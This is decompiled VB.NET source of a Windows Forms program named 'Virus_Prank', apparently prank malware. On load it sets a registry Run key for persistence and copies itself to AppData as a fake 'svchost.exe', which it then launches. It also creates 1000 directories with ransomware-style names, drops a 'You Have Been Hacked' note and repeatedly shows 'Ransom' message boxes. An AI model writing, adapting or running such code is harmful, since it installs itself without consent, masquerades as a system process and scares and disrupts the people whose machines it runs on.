Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Virus_Prank.My

Namespace Virus_Prank
	' Token: 0x02000008 RID: 8
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000013 RID: 19 RVA: 0x000022FF File Offset: 0x000004FF
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000014 RID: 20 RVA: 0x00002320 File Offset: 0x00000520
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Dim text As String = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Hacker Man", Nothing))
			Dim flag As Boolean = Operators.CompareString(text, Application.ExecutablePath.ToString(), False) = 0
			If Not flag Then
				MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Hacker Man", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Microsoft\svchost.exe")
			End If
			Try
				File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Microsoft\svchost.exe")
				File.WriteAllText(Path.GetTempPath(), Application.ExecutablePath)
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Microsoft\svchost.exe")
			Catch ex As Exception
			End Try
			Dim num As Integer = 1
			Do
				FileSystem.MkDir("You_Have_Been Hacked ! @$%^$^& H@ack_Troj_Ransomwar@# " + Conversions.ToString(num))
				num += 1
			Loop While num <= 1000
			Dim streamWriter As StreamWriter = New StreamWriter("Read Me!.txt")
			streamWriter.Write("You Have Been Hacked By Hacker Man >> Abdelrahman << !")
			streamWriter.Close()
		End Sub

		' Token: 0x06000015 RID: 21 RVA: 0x00002444 File Offset: 0x00000644
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Interaction.MsgBox("!@$%^&_@Ransom$*_-!@$%^&_@!@$%^&_@!@$%^&_@!@$%^&_@", MsgBoxStyle.Critical, "")
		End Sub

		' Token: 0x1700000A RID: 10
		' (get) Token: 0x06000018 RID: 24 RVA: 0x0000255F File Offset: 0x0000075F
		' (set) Token: 0x06000019 RID: 25 RVA: 0x0000256C File Offset: 0x0000076C
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property
	End Class
End Namespace
